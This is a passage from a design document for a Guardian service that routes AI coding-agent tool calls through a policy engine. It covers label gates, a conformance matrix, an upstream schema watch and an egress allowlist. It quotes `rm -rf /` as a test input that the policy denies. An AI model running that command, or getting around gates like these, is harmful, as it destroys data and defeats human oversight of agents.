(`policy/lib/agt_ifc.rego`) requires `count(labels) > 0` *before* it consults the lattice,
so a snapshot carrying no labels never reaches the dominance check: `verdict_propagating`
takes its violation branch and the flow is **denied**, `ifc_clearance_violation`, however
permissive the configured clearance is. AGT's own tests say the same in two halves
(`policy/lib/agt_ifc_test.rego`): `test_missing_and_empty_labels_deny_fail_closed` pins that
an empty array is not an allowed flow, and `test_source_labels_defaults_to_empty` pins that
a missing member reads as that same empty array. Measured against the shipped bundle: a
benign `ls -la` denies with no `input` member and denies identically with
`source_labels: []`. So a session with no seed is a session that can do nothing at all —
and combined with the wire finding above, that is the sharpest available statement of the
gap: **a conforming ACS v0.1.0 deployment cannot obtain a first label from the wire, and
AGT denies every session that has none.**

**⚠️ Found in the same measurement — IFC deny outranks every other gate, so a label-free
snapshot is blamed on IFC rather than on the rule that would otherwise have answered.**
`policy/lib/agt_default.rego`'s own header states the order: *"IFC deny > confidence deny >
budget deny > content_hash deny > egress deny > pattern deny > drift warn > allow"*.
Measured, same bundle, same config, one variable: `rm -rf /` carrying `["public"]` denies
`destructive_shell_command_blocked`; the same command carrying no labels denies
`ifc_clearance_violation`. Still denied, differently blamed — and the second reason sends a
reader looking for a clearance problem instead of at the command. This is also why the
fixtures that build snapshots **by hand** and assert a non-IFC reason had to start carrying
a label (`packages/agt-bridge/test/bridge.test.ts`, `test/redaction.test.ts`): without one,
the assertion is measuring IFC. Snapshots the Guardian assembles were never exposed to
this, because it supplies the session's labels itself.

**⚠️ A consequence measured while doing that — a clean allow in this deployment now carries
`result_labels`.** With no deny, transform, escalate or warn firing, `agt_default.rego`'s
severity chain falls through to its own **last** `else` clause — `ifc_verdict`'s allow,
carrying what IFC propagated — rather than to the bare `default verdict := {"decision":
"allow"}`. Measured at the result gate: a benign output that used to return
`{decision: "allow"}` returns `{decision: "allow", result_labels: ["public"]}`
(`test/redaction.test.ts`). Harmless to the ACS decision — `mapVerdict` never reads
`result_labels`; `server.ts` hands it straight to `persistIfcLabels` — and load-bearing for
the round trip, since it is what gives N25 something to persist at both gates rather than
only at the request one.

**⚠️ And the cost, which belongs in the record rather than absorbed silently — turning the
gate on makes `input.ifc.source_labels` a required member of every snapshot in the
deployment**, including for callers with no session concept at all.
`packages/agt-bridge/test/bridge.test.ts` predates every part of this slice, builds
snapshots by hand, and knows nothing about sessions; it now spreads a `publicLabel` into
them and says why in its own comment. Measured by deleting that spread from one test: a
benign `ls -la` comes back `deny`. The `git status` behind it in the same loop was never
reached — the first assertion threw, which is visible in that run's own `16 expect() calls`
against the clean run's `17` — so it is denied by the same mechanism the gate probe shows
rather than by anything that capture measured. Every snapshot builder in a deployment
inherits this, not only the ones that have a session to draw a label from.

**⚠️ Risk row 13's `seq` duplicate was not a dependency of this slice — the expectation was
checked and did not hold.** Row 13 says a per-session monotonic sequence "would need the
duplicate closed first", naming V6. It did not, and the reason is structural rather than
careful: S14's `seq` is derived by a fresh host subprocess re-reading the log per hook, so
two concurrent hooks can derive the same number, while S3's is assigned inside one
synchronous `append` in the Guardian's single process — and, more to the point, **S3's
order is carried by `prev_hash`, not by the counter.** Two entries claiming the same `seq`
would still have to agree on a hash covering the entry before them; `seq` is an index for
readers, and the Inspector's chain-break check compares hashes rather than sequence
numbers. Recorded because leaving the row unamended would have the next reader believe V6
took a dependency it did not.

**⚠️ S4 ships as a store affordance with no writer on the request path, and the wire field
it would read is right there.** `setIntent` keeps the first intent a session declares and
drops later ones — the immutability rule is implemented and tested — but nothing in
`packages/guardian/src/server.ts` calls it, so no session in this slice ever records one.
`hooks/tool-call-request.json` carries an optional `intent` object (`description`, `goal`),
so unlike the labels above this is **not** a wire gap: the field exists and is simply not
wired. Recorded as scope, not as a finding about ACS or AGT.

**⚠️ U22's reader has no affordance ID, so Detail C draws S3 → U22 with no N-node between
them.** Every other view in the diagram reaches its store through a named reader — U20 and
U21 through N50 (`tailEnvelopeLog`), U23 through N51 (`tailAuditLog`) — and U22 was drawn
as a third child of N50, which it never calls: it reads a different file through a
different function, `tailSessionContextLog`. The false edge is removed rather than replaced
with a minted number, because minting one is a shaping decision and this note is where it
is asked for. The same is true of `supplySourceLabels()` and `loadSessionContext()`, which
ship named and unnumbered.

Plan: `docs/superpowers/plans/2026-08-14-v6-session-state-and-provenance-carriage.md`.

---

## V7: Conformance matrix

**Demo:** Eight intervention points by five AGT verdicts, every cell resolved — `expressed` where ACS v0.1.0 expresses AGT, `guardian_only` where only process-local Guardian knowledge can, `unexpressed` with a named reason where it cannot. Plus the Trace pillar, measured as an explicit non-claim.

**⚠️ Demo corrected (was "all green").** The original sentence was already contradicted by this slice's own body, which has expected two honestly-red model-call cells since shaping; D10 adds two more. A matrix that must be all green to count is a matrix under pressure to redefine the claim, which is the opposite of what C2 is for. The demo now asks for every cell *resolved*, which is achievable and is the stronger deliverable.

| # | Place | Component | Affordance | Control | Wires Out | Returns To |
|---|-------|-----------|------------|---------|-----------|------------|
| U30 | P5 | conformance | coverage matrix, 8 intervention points × 5 AGT verdicts | render | — | — |
| U32 | P5 | conformance | rendered ACS ↔ MS-ACS mapping table | render | — | — |
| U33 | P5 | conformance | trace-pillar row: each required OTel attribute, its v0.1.0 wire source, and whether a wire consumer can emit it | render | — | — |
| N40 | P5 | conformance | `conformance` runner (`bun run conformance`) | call | → N41, → N42, → N43, → N44, → N49 | — |
| N41 | P5 | conformance | intervention-point round trip, validated against `policy-input.schema.json` | call | — | → N47 |
| N42 | P5 | conformance | verdict round trip: AGT verdict → ACS decision → AGT verdict, assert identity | call | — | → N47 |
| N43 | P5 | conformance | `enforced_identity` recomputation check | call | — | → N47 |
| N44 | P5 | conformance | failure-domain check: an AGT evaluation error arrives as an honored `deny`; a delivery failure applies the negotiated posture and writes an audit event | call | — | → N47 |
| N49 | P5 | conformance | trace-pillar check: every attribute `trace/otel-mapping.json` marks required, resolved against the v0.1.0 wire schemas | call | — | → N52 |
| N47 | P5 | conformance | `renderCoverageMatrix()` — the 8 × 5 cells N41–N44 measure, and nothing else | call | → U30 | — |
| N52 | P5 | conformance | `renderTraceRows()` — N49's trace-pillar rows | call | → U33 | — |
| N48 | P5 | conformance | `renderMappingTable()` | call | → U32 | — |
| S10 | shared | store | `mapping.yaml` — the file the runtime already reads (V1, S10), read here by the harness that measures and publishes it | — | — | → N41, → N42, → N48 |

**⚠️ `renderMatrix()` split before anything was written to inherit it.** N47 was one function wired to U30, U31 **and** U33 — three renderings of three different measurements. A coverage cell is an intervention point against an AGT verdict; a trace-pillar row is a required OTel attribute against its wire source; an upstream diff is a changed field in a surface `agt.lock` pins. They share a verb and nothing else, and a single `renderMatrix` is the name that would have let the second and third arrive as columns of the first. N47 is now `renderCoverageMatrix()` → U30, **N52** is `renderTraceRows()` → U33, and `renderUpstreamDiff()` → U31 is **N53, which is V8's** — it has no input until V8's `diffSurfaces()` (N46) exists, which is why it sits in §V8's table rather than this one. **So the split reaches V8 and adds to its scope**: until now U31 was rendered by a function V7 built, and V8 inherited it: after the split `renderUpstreamDiff()` is V8's to build, and V8's affordance list gains N53 — `slices/v8/README.md` included. §V8 records that at its own table, so it does not have to be found by diffing this one. The three names are frozen in `slices/v7/README.md`; the columns of the 8 × 5 are AGT's five verdicts, never ACS's five dispositions.

**⚠️ Gap discovered in V1 — the Guardian's outbound envelopes are validated by nothing.** Inbound requests get Ajv against all 43 v0.1.0 schemas (N21), but responses are hand-built objects checked by no schema. The conformance harness would therefore measure a wire format that was never itself contract-checked — which quietly weakens exactly the claim C2 exists to prove. Add response validation before the matrix is published. Related: V1 found that `response-envelope.json`'s `result` unconditionally `$ref`s `AcsResult`, which requires `decision` — a ServerHello has no such field, so a handshake response cannot satisfy it. That looks like a genuine v0.1.0 spec gap (no discriminated union for non-decision methods) and is worth an upstream ACS issue, not just a red cell.

> ⚠️ **Corrected here, in the final review — "all 43 v0.1.0 schemas" overstated what V1 actually built, and V7's own measurement is what caught it.** `packages/guardian/src/validate-envelope.ts` compiles only three schemas against an inbound request — `request-envelope.json` and, method-gated, `hooks/tool-call-request.json`/`hooks/tool-call-result.json`. All 43 are registered with Ajv so `$ref`s resolve, but registration is not compilation, and compilation is what "checked against" means. `validate-envelope.ts:256-275` — added by this slice — states the correction directly; `packages/guardian/src/validate-response.ts:3`, new in this slice, carried the same overstated phrasing into its own header and is fixed there too.

**⚠️ Planning resolved the shape that gap forces, and decided not to file.** The validator has **three** answers, not two: `valid`, `invalid`, and `unexpressible` — the handshake response takes the third, carrying the reason, because a two-answer validator would have to call a correct response invalid or skip it in silence. It **reports and never throws**, and never alters the response: it runs on the decision path, and a validator that could turn a governed tool call into an error response would be a fail-open of the family this project keeps closing. Filing upstream is **not** V7 scope — the slice lands the measured cells and the stated consequence, and filing stays a separate deliberate act.

**⚠️ The Trace pillar lands here too (D10), and three of its rows are already known 🔴, covering five attributes.** `trace/otel-mapping.json` is normative — a deployment emitting OTel for the Trace pillar MUST use its span names and required attributes verbatim. Measured against the pinned schemas after V2 shipped:

| Required by the mapping | Source in v0.1.0 | Emittable by a wire consumer? |
|---|---|---|
| `gen_ai.tool.name` on `gen_ai.tool.call` | `payload.tool.name`, `required` | 🟢 |
| `acs.capability` on `gen_ai.tool.call` | `payload.capability`, **optional** — `hooks/tool-call-request.json` requires only `tool` and `arguments` | 🔴 a conformant envelope may omit it |
| `acs.decision` on the `acs.decision` span event | `AcsResult.decision`, `required` | 🟢 |
| `acs.evaluator` on the `acs.decision` span event | `AcsResult.metadata.evaluator` — **optional**, under an optional `metadata` | 🔴 declared, never guaranteed |
| `acs.confidence`, `acs.evaluator_version`, `acs.model_id` (required "when present in the decision envelope") | `AcsResult.metadata.{confidence,evaluator_version,model_id}` — **optional**, under an optional `metadata` | 🔴 declared, never guaranteed |

> ⚠️ **Corrected during V7 execution — the two rows above previously read "none — `AcsResult` has no such field", and that was wrong.** N49 resolved them against the schema and found `$defs.AcsResult.properties.metadata.properties` declares exactly `evaluator`, `evaluator_version`, `evaluation_duration_ms`, `model_id` and `confidence` — with `metadata`'s description stating the purpose outright: *"ACS-defined evaluator and observability metadata … keeping the split clean lets **Trace consumers** key on a stable shape."* The rows stay 🔴, because neither `metadata` nor its members are required (`AcsResult.required` is `["type", "acs_version", "request_id", "decision"]`). But they are 🔴 for `acs.capability`'s reason — present but optional — not for the reason this table gave. (Rows, not cells, and the third column was headed "Cell" until the final review: these are U33's trace rows, which commitment 4 keeps out of the 8 × 5 entirely. The 🟢/🔴 here are this table's own marks for one yes-or-no question, not the matrix's three statuses.) The error was in the shaping round and propagated into V7's plan; the measurement is what caught it, which is the argument for measuring.

`N49` is what turns that table into measured cells rather than this prose, `N52` renders those rows, and `U33` is where they land. The finding worth publishing is not the missing fields but their consequence: **a downstream consumer of the ACS wire cannot emit a conformant trace** — only the Guardian can, from process-local knowledge the contract does not carry. That cuts directly against R5.1/R5.2 and against V2's design, where S6 is readable by anything and the Inspector proves it by importing nothing. An OTel exporter reading S6 hits the same wall.

**Scope boundary:** V7 *measures* the Trace pillar. It does not build an exporter. If an exporter is ever wanted it has to live in the Guardian for the reason above, and that is a slice of its own, not V7 scope.

**⚠️ One more cell to resolve, from V3.** AGT's `warn` verdict is reachable only through a host-supplied annotation — the stock drift gate reads `input.annotations.drift_score`, and annotations come from a manifest-declared annotator, never from the snapshot (§V3's evidence). The ACS v0.1.0 tool-call-request payload carries `tool`, `operation`, `capability`, `arguments`, `raw_command`, `intent` and nothing a drift or confidence score could be derived from. So the matrix's `warn` column resolves the same way D10's attributes did: **`guardian_only`** — a downstream ACS consumer cannot drive AGT's `warn` gate, because the contract does not carry the input that gate reads. (It resolves that way for a *different reason*, though, and the final review caught the two being blurred: D10's attributes are fields the wire carries and never requires, while the drift score has no field on the wire to be optional in.) V3 makes `warn` live from a deployment-supplied score, which is what AGT's design asks a host to do, so this is a note about ACS v0.1.0's coverage rather than about AGT.

**⚠️ A third cell resolves the same way, found while freezing V7's names — R1.4's.** AGT's `InterventionPointResult` carries `inputIdentity`, `enforcedIdentity` and the `policyInput` those hash (`agent-control-specification`, `dist/src/index.d.ts`); the distinct pair is why A4 was amended from the Python binding to the Node one, since without it N43 is impossible (§V1 C1, risk row 7). **ACS v0.1.0 carries no action-identity field on any of its 43 schemas** — `identity` occurs twice in the whole spec directory, as `session-start.json`'s `user_identity` and as prose inside `skill-register.json`, and neither is this. So R1.4's cell resolves `guardian_only`, exactly as the `warn` column and D10's Trace attributes do. Three independent findings with one shape is itself the finding worth publishing: **v0.1.0's response envelope carries a decision, and never has to carry the evidence for it.** A downstream consumer can read what was decided, and can neither reproduce it nor bind it to what executed.

> ⚠️ **Sharpened during V7 execution — and corrected a second time here, in the final review.** This paragraph used to end *"no evaluator, no confidence, no identity of the action the decision bound to"*, and the first two of those three were wrong — see the corrected D10 table above. `AcsResult.metadata` declares `evaluator`, `evaluator_version`, `evaluation_duration_ms`, `model_id` and `confidence`, expressly so Trace consumers can key on them. The identity half stands: v0.1.0 carries no action-identity field anywhere. The V7-execution pass then called the shape all three findings share **optionality**, which cannot be true in the same paragraph as "carries no action-identity field anywhere" — that sentence names an absence, not an optional field. Measured split: **one** of the three (the Trace attributes) is optionality — a field the envelope may carry and is never obliged to; **two** (the `warn` gate's input and R1.4's identity) are a flat absence — there is no field to be optional in the first place. The v0.2 ask stops being "add these fields" and becomes "require the ones already there, and add the ones that are not" — two fields, not one.

**⚠️ N43 had an input problem the bridge deliberately created — resolved in planning: a second message on the role, not a fatter answer.** `PolicyBridge.evaluate` answers with the verdict alone: `inputIdentity`, `enforcedIdentity` and `transformedPolicyTarget` were taken off its return in the PR #10 review, because the one production caller destructured `{ verdict }` and dropped the rest (`packages/agt-bridge/src/index.ts`). **Settled:** `PolicyBridge` gains `evaluateWithEvidence()`, and `evaluate()` is implemented *in terms of it* — so there is exactly one call into the SDK, the narrow answer is provably a projection of the wide one, and the decision path still reads a verdict. Two alternatives were rejected with reasons: widening `evaluate`'s **return** re-creates the bag that review removed, with the harness as its only new reader and `server.ts` still dropping three fields on every answer; a **separate factory** for the harness creates a second path to AGT, which means a conformance harness certifying the path production does not take. See `docs/superpowers/plans/2026-08-16-v7-conformance-matrix.md`, Task 1.

**⚠️ What N43 recomputes, measured during planning rather than read from AGT's docs.** The identity is the SHA-256 of the **key-sorted, whitespace-free** JSON of `policyInput`, prefixed `sha256:`; `enforcedIdentity` is the same hash after replacing **`policy_target.value` alone** with `verdict.transform.value`. Both reproduce exactly against the pinned SDK. The snapshot's own copy of that leaf is **not** updated — so **AGT's enforced identity binds to the policy target it rewrote, not to the document the host will execute.** That is what makes R1.4's cells `guardian_only` rather than expressed, and it sharpens the v0.2 ask below.

**⚠️ The v0.2 fork, and why "add a field" is not the whole proposal.** The host applies ACS `modifications` to the **ACS payload**; AGT hashed its **policy input**. Two documents, two vocabularies. So adding `enforced_identity` to `AcsResult` is necessary and not sufficient: a host receiving it could not check it, because the wire never carries the policy input — the snapshot is Guardian-internal by design, which is V2's whole shape. v0.2 needs either **(a)** an identity computed over a canonicalization of the *ACS* action the host will execute, which AGT does not produce today, or **(b)** enough of the policy input on the decision envelope for the host to recompute, which re-exposes exactly the snapshot ACS keeps host-side. V7 publishes the fork; it does not pick a branch, and it files nothing upstream.

**⚠️ A cell therefore has three answers, and planning named them.** `expressed` — ACS v0.1.0 expresses AGT here. `guardian_only` — the Guardian can do it from process-local knowledge and a wire consumer cannot; **three independent findings have now landed on this one** (the `warn` column, D10's Trace attributes, and R1.4's identity), which is itself the finding worth publishing. `unexpressed` — it cannot, and the cell carries the reason. Deliberately not `green`/`red`: this slice retracted "green" as a success name one paragraph up, and a two-valued status would force each of those three findings into a lie. There is no default and no fourth member — a cell no check touched reads `unexpressed` with *"no check measured this cell"*, never expressed by omission, which is the one way a resolved matrix could quietly become a green one.

> ⚠️ **Corrected during Task 10, fix round 1.** This paragraph read "D10's two Trace
> attributes". That count was stale against the ⚠️ two paragraphs up: N49's actual
> measurement (rendered as U33) found **six** wire fields read `✖`, not two —
> `acs.capability`, plus five sourced from `AcsResult` (`evaluator`, `confidence`,
> `evaluator_version`, `model_id`, `reasoning`). D10's own table above shows only four of
> those five under `metadata`; `acs.reasoning` is not a `metadata` member and was never a row
> of that table at all. So "D10's Trace attributes" is left with no number here, the same way
> the V7 execution facts file did — a single count would either understate D10's own table or
> misname U33's fuller measurement as D10's, and the paragraph does not need one to make its
> point.

**Expected two cells to be honestly red. The published matrix resolves fourteen against a stated reason, and the Trace attributes are not among them.**

> ⚠️ **Corrected after execution, against the matrix V7 actually published.** This sentence read *"Expect two cells to be honestly red — now four"*, and counted D10's Trace attributes as two of the four. Both halves are retired. **The count**: a point with no ACS v0.1.0 target is red at every one of AGT's five verdicts, so D4's two model-call points are **ten** `unexpressed` cells, not two; four more resolve `unexpressed` at `transform`, where that point's `intervention_points` row declares no `modifications` rule to express the rewrite; eight resolve `guardian_only`; eighteen `expressed`. **The category**: a Trace attribute is a U33 row and not a cell of the 8 × 5 at all — commitment 4 froze that distinction, and this sentence predates it. D10's finding is undiminished; it is simply rendered in its own table. Both numbers are readable off the capture in `docs/demos/v7-runbook.md`.

Cells resolved against a stated reason are worth more than a green matrix that quietly redefines the claim — which is why `green` is no longer a status name here — and they are the forcing function for `steps/modelCall` and for **requiring** `AcsResult.metadata.evaluator` in v0.2 rather than adding it, since it is already there.

R5.3 lands here as a declaration with its evidence beside it, and the two are not one artifact. This implementation declares which ACS profiles and pillars it claims and which it does not; the coverage matrix and the trace-pillar rows are what each line of that declaration is *measured against*. The Trace pillar is declared **not** claimed, with the measured reason attached.

**⚠️ This sentence used to read "the matrix *is* the profile declaration."** That is the collapse commitment 2 of `slices/v7/README.md` forbids one table over: `mapping.yaml` declares, the matrix measures, and a sentence that makes the matrix the declaration lets a claim stand in for its own evidence — which is the same move as a matrix under pressure to be green. The declaration is a statement this project makes and can be wrong about; the matrix is what catches it (PR #16 review).

Plan: `docs/superpowers/plans/2026-08-16-v7-conformance-matrix.md`.

---

## V8: Upstream contract watch

**Demo:** Point the harness at AGT `main`. A changed enum value is reported as a `SurfaceDiff` naming the surface and the field that moved.

**⚠️ Demo restated in this slice's own noun (was "turns a cell red and names the field").** A cell is V7's — an intervention point against an AGT verdict, measured by N41–N44 and rendered by N47 `renderCoverageMatrix()`. A changed enum value is none of those things: it is a named surface, a named field, and what that field was against what it is now, which is a `SurfaceDiff` that N53 renders into U31. The old sentence described the wiring V7's split removed, where one `renderMatrix()` fed U30, U31 and U33 and an upstream diff could arrive as a column of the coverage matrix.

| # | Place | Component | Affordance | Control | Wires Out | Returns To |
|---|-------|-----------|------------|---------|-----------|------------|
| U31 | P5 | conformance | surface-diff detail: changed point, verdict, or schema field | render | — | — |
| N45 | P5 | conformance | `fetchUpstreamSurfaces()` — AGT wire schemas and enums at `main` | call | → S12 | — |
| N46 | P5 | conformance | `diffSurfaces(pinned, upstream)` — told a `PinnedSurfaces` (S11) and an `UpstreamSurfaces` (S12); it does not read `agt.lock` itself | call | — | → N53 |
| N53 | P5 | conformance | `renderUpstreamDiff()` — N46's surface diff | call | → U31 | — |
| S12 | P5 | store | upstream AGT surfaces — the eight surfaces below, fetched from `main` by N45 | — | — | → N46 |
| S11 | shared | store | `agt.lock` — the pinned ref `verify:pin` already resolves (V1, S11), read here for the pinned side of the diff | — | — | → N46 |

**⚠️ N53 is new scope for this slice, added by V7's `renderMatrix()` split (§V7).** Until that split, U31 was rendered by V7's N47 — a function this slice inherited rather than built. It builds one now: `renderUpstreamDiff()` is V8's because its only input is this slice's own N46, so V7 can neither build it nor test it. **S11 is not new scope and was simply missing**: a diff has two sides, Detail C's shared-store row has named N46 a reader of `agt.lock` since shaping, and the breadboard carries `S11 -.-> N46` — only this table was silent, the same asymmetry §V7 just closed for S10. **This slice's affordances are therefore U31, N45, N46, N53, S12, S11**, and `slices/v8/README.md`'s affordance line carries the same six.

Surfaces watched, and nothing else (R2.4): `manifest.schema.json`, `policy-input.schema.json`, `verdict.schema.json`, `snapshot.schema.json`, the intervention-point enum, the verdict enum, `reserved-reasons.json`, and the stock bundle's `data.agt.defaults.config` keys.

**⚠️ V8 planning located all eight by cloning AGT at the pinned ref rather than by reading — and eight surfaces are not eight files.** Five are documents, two are enums that live *inside* documents already fetched, and one has no document at all. A fetcher written from the list above alone cannot express the last three.

| # | Surface | Where it is, at ref `81955d48` | Shape |
|---|---|---|---|
| 1 | `manifest.schema.json` | `policy-engine/spec/schema/manifest.schema.json` | document |
| 2 | `policy-input.schema.json` | `policy-engine/spec/schema/wire/policy-input.schema.json` | document |
| 3 | `verdict.schema.json` | `policy-engine/spec/schema/wire/verdict.schema.json` | document |
| 4 | `snapshot.schema.json` | `policy-engine/spec/schema/wire/snapshot.schema.json` | document |
| 5 | intervention-point enum | **inside 1**, at `/properties/intervention_points/propertyNames/enum` | 8 values: `agent_startup`, `input`, `pre_model_call`, `post_model_call`, `pre_tool_call`, `post_tool_call`, `output`, `agent_shutdown` |
| 6 | verdict enum | **inside 3**, at `/properties/decision/enum` | 5 values: `allow`, `deny`, `warn`, `escalate`, `transform` |
| 7 | `reserved-reasons.json` | `policy-engine/spec/reserved-reasons.json` | document |
| 8 | `data.agt.defaults.config` keys | **no document** — the `cfg.<key>` reads in `policy-engine/policy/lib/agt_default.rego` | 10 keys: `approval.approvers`, `approval.required`, `budgets`, `confidence.min_score`, `content_hash.enforce`, `drift.warn_threshold`, `egress`, `ifc.sink_clearance`, `patterns`, `redact` |

**⚠️ The wire schemas exist in two copies at the pinned ref, identical there.** `policy-engine/spec/schema/wire/` and `policy-engine/generator/acs_generator/schema/wire/` both carry `policy-input`, `verdict` and `snapshot`; `manifest.schema.json` sits at both `spec/schema/` and `core/schema/`. Measured byte-identical for all four watched documents. The watch reads the `spec/` copy — the one V7's schema leg already validates against and the one AGT's own specification cites — so a divergence *between* the copies upstream is invisible to it. A known limit, recorded rather than closed: watching both doubles every row for the common case where they agree.

Runs on a schedule in CI. MS-ACS is `0.3.1-beta` and warns of breaking changes between minor versions, so this is the slice that decides whether the reference implementation is still true six months after the meeting.

**⚠️ What this slice confirms, and what it does not — the demo sentence invites a stronger reading than it can carry.** Upstream movement cannot break the running implementation: `agent-control-specification` is pinned at exactly `0.3.1-beta.0` (no caret), `agt.lock` pins the ref, and `verify:pin` proves `policy/lib` is byte-identical to it, so nothing on `main` reaches this repository until a human bumps the pin. Forward compatibility is bought by pinning, not by watching. What upstream movement *does* break is the truth of the published claim — V7's matrix asserts ACS v0.1.0 expresses AGT at 40 coordinates, measured against a ref that quietly becomes historical, and a confidently wrong table is this slice's real subject.

**⚠️ V9 planning found a second `tools`-adjacent hazard on the seam this section already watches, and V9 closes it because V9 is what makes it reachable.** The row below rules that a hookmap `tools` entry naming a string the host never dispatches silently governs nothing. Its neighbour is the *opposite* asymmetry, in `mapping.yaml` rather than a hookmap: `pre_tool_call.modifications.into_argument` is the literal `command`, applied to every tool regardless of what that tool's arguments are called. Today it cannot misfire, because `^Bash$` is the only matcher and `command` is the only argument. V9 widens the matcher, and at that moment a `transform` on a `WebFetch` call is emitted as `parameter_overrides.command` — a key the tool has no argument for — while `url`, still carrying whatever AGT redacted, is delivered untouched. **Measured through the shipped `mapVerdict`**, not reasoned about, and recorded in `spike-unreached-gates.md` §A7. Unlike the six posture-seam faults and the `tools` row, this one is *created* by V9's own widening, so it is V9's to close and not a residual: N54 makes the target argument and the override argument one declaration read twice.

**R2.5 asks for more than a surface diff, and V8 delivers part of it.** The requirement says a moved surface "shows up as a failing case rather than silent rot" — that is a re-measurement, not a textual comparison. The reachable half is re-asking V7's own question of `main`: validating the policy input the Guardian would send against `main`'s `policy-input.schema.json`, which fails rather than diffs. The unreachable half is re-running the whole coverage matrix against `main`, because that evaluates through the AGT **Node SDK** and the SDK at `main` is not published to npm — it would have to be built from source on every scheduled run. **That gap is a slice of its own and is not V8's**; V8's declaration states the boundary in these words so no reader takes the watch for a compatibility guarantee.

---

## V9: A second tool shape, and the egress gate

**Demo:** Ask for a web fetch of a host the allowlist does not cover. AGT's stock `egress` gate denies it — a fourth gate class live, from one `data.json` key and no code. Then ask for the same destination over `curl`, and it denies again, this time from a Guardian-extracted destination. Both verdicts come from the same unforked rule.

Every measurement in this section is in `docs/shaping/spike-unreached-gates.md`, taken against the pinned bundle through the shipped assembler and the shipped `mapVerdict` rather than read out of AGT's documentation.

### Detail V9: affordances

Breadboarded against the shipped code, so every name below points at something real.

**UI affordances — all existing, none new.**

| # | Place | Component | Affordance | Control | Wires Out | Returns To |
|---|-------|-----------|------------|---------|-----------|------------|
| U2 | P1 | claude-code | tool permission outcome in transcript — now also carries `egress_destination_not_allowed` | render | — | — |
| U11 | P2 | opencode | tool decision surface | render | — | — |
| U20 | P4 | inspector | envelope stream, request/response JSON pairs | render | — | — |
| U21 | P4 | inspector | decision badge: decision + `policy_references` + `reason_codes` | render | — | — |

**No new UI, and that is the right answer rather than an omission.** The fourth gate class denies through the same surfaces the first three have used since V3, because a deny is a deny — U21 already renders whatever `reason_codes` comes back. Inventing a surface for `egress` would claim it is a different kind of decision than `destructive_shell_command_blocked`, and it is not.

**Code affordances.**

| # | Place | Component | Affordance | Control | Wires Out | Returns To |
|---|-------|-----------|------------|---------|-----------|------------|
| N54 | P3 | guardian / `map-verdict.ts` | **NEW** `resolvePolicyTargetArgument(mapping, point, toolName)` — S10's `by_tool` table, falling back to its `default` | call | — | → N23, → N24 |
| N55 | P3 | guardian / `annotate-egress.ts` | **NEW** `annotateEgressDestination(name, config, preliminary)` — answers `{destination}` when it finds one in `raw_command`, `{}` when it does not | call | — | → N30 |
| N23 | P3 | guardian | `assemblePreToolCallSnapshot(envelope, sourceLabels, policyTargetArgument)` — **third parameter is new**; writes the normalised leaf and forwards `raw_command` | call | → N30 | — |
| N24 | P3 | guardian | `mapVerdict(verdict, mapping, point, policyTargetArgument)` — **fourth parameter is new**; `synthesizeModifications` keys `parameter_overrides` by it instead of by `rule.into_argument` | call | → N25, → N26 | → N4, → N13 |
| N21 | P3 | guardian | `validateEnvelope()` — `raw_command` already typed at `validate-envelope.ts:100`; V9 is what first populates it | call | → N22, → N27 | — |
| N31 | P3.1 | agt-bridge | `AgentControl.fromPath(manifest)` — **now always constructed with an annotator dispatcher**, because the manifest declares one | call | — | → N30 |
| N30 | P3.1 | agt-bridge | `evaluateInterventionPoint(point, snapshot)` — dispatches N55 while building the policy input | call | → N55 | → N24 |
| N2 | P1 | `@acs/host-adapter` | `buildEnvelope()` — `buildPayload`'s request branch reads S1's new `raw_command` path | call | → N4 | — |
| N11 | P2 | `@acs/host-adapter` | `buildEnvelope()` — same module as N2, reads S2's | call | → N13 | — |

**Data stores.**

| # | Place | Store | What changes |
|---|-------|-------|--------------|
| S17 | P1 | **NEW** `.claude/settings.json` and `hosts/claude-code/settings.json` | The `PreToolUse` matcher, `^Bash$` → `^(Bash\|WebFetch)$`. **Never in this breadboard before**, which is exactly why the one-tool limit went unnoticed through eight slices: the file that decides which tools are governed at all had no affordance |
| S10 | shared | `mapping.yaml` | Gains `intervention_points.<point>.policy_target_argument: {default, by_tool}`. `modifications.into_argument` is **removed**, not kept alongside — two declarations of the same fact are two things that can disagree |
| S7 | P3.1 | `policy/manifest.yaml` | `policy_target` → the normalised leaf; `tools:` gains `WebFetch` and `webfetch`; gains `annotators: egress` and `pre_tool_call.annotations.egress` |
| S8 | P3.1 | `data.agt.defaults.config` | Gains `egress` **with an explicit `allowlist`** (risk row 21) |
| S1 | P1 | `claude-code.hookmap.yaml` | `PreToolUse` gains `raw_command: $.tool_input.command` |
| S2 | P2 | `opencode.hookmap.yaml` | Request gate gains `raw_command`, and its `tools:` list gains OpenCode's fetch tool |

**This slice's affordances are N54, N55, N23, N24, N21, N31, N30, N2, N11, S17, S10, S7, S8, S1, S2, and the four existing U's.**

### Wiring

```mermaid
flowchart TB
    subgraph P1["P1: Claude Code session"]
        S17["S17: settings.json PreToolUse matcher"]
        S1["S1: claude-code.hookmap.yaml"]
        N2["N2: buildEnvelope()"]
        U2["U2: permission outcome"]
    end

    subgraph P2["P2: OpenCode session"]
        S2["S2: opencode.hookmap.yaml"]
        N11["N11: buildEnvelope()"]
        U11["U11: decision surface"]
    end

    subgraph P3["P3: ACS Guardian service"]
        N21["N21: validateEnvelope()"]
        N54["N54: resolvePolicyTargetArgument()"]
        N23["N23: assemblePreToolCallSnapshot()"]
        N24["N24: mapVerdict()"]
        N55["N55: annotateEgressDestination()"]
        N26["N26: envelope log sink"]

        subgraph P31["P3.1: AGT bridge"]
            N31["N31: AgentControl.fromPath()"]
            N30["N30: evaluateInterventionPoint()"]
            S7["S7: policy/manifest.yaml"]
            S8["S8: data.agt.defaults.config"]
        end
    end

    subgraph P4["P4: Envelope Inspector"]
        U20["U20: envelope stream"]
        U21["U21: decision badge"]
    end

    S10["S10: mapping.yaml"]

    S17 -.->|which tools reach the shim| N2
    S1 -.->|raw_command path| N2
    S2 -.->|raw_command path| N11
    N2 --> N21
    N11 --> N21
    N21 --> N54
    S10 -.->|by_tool table| N54
    N54 -.->|argument name| N23
    N54 -.->|argument name| N24
    N23 -->|snapshot: normalised leaf + raw_command| N30
    S7 -.-> N31
    S8 -.-> N31
    N31 -.-> N30
    N30 -->|dispatch| N55
    N55 -.->|{destination} or {}| N30
    N30 -.->|verdict| N24
    N24 --> N26
    N24 -.-> U2
    N24 -.-> U11
    N26 -.-> U20
    N26 -.-> U21

    classDef ui fill:#ffb6c1,stroke:#d87093,color:#000
    classDef nonui fill:#d3d3d3,stroke:#808080,color:#000
    classDef store fill:#e6e6fa,stroke:#9370db,color:#000
    classDef new fill:#90EE90,stroke:#228B22,color:#000

    class U2,U11,U20,U21 ui
